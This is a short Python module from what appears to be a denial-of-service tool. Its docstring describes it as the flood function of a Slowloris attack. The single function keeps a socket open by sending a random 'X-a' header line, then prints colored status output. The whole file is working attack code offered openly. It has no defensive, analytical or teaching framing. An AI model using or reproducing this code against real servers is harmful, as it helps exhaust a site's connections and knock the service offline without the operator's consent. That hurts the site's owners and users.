"""This module provides the flood function for a Slowloris DoS attack."""

import random
import socket

from colorama import Fore


def flood(sock: socket.SocketType) -> None:
    """Keep alive the sockets in Slowloris flood.

    Args:
        - sock - The socket to be kept alive

    Returns:
        None
    """
    laddr, port = sock.getsockname()
    random_header = random.randint(1, 5000)
    sock.send(f"X-a: {random_header}".encode("utf-8"))
    header_sent = f"{Fore.RESET} Header Sent:{Fore.BLUE} X-a {random_header:>4}"
    print(
        f"{Fore.RESET} --> Socket: {Fore.BLUE}{laddr}:{port} {Fore.RESET}|{header_sent} {Fore.RESET}"
    )
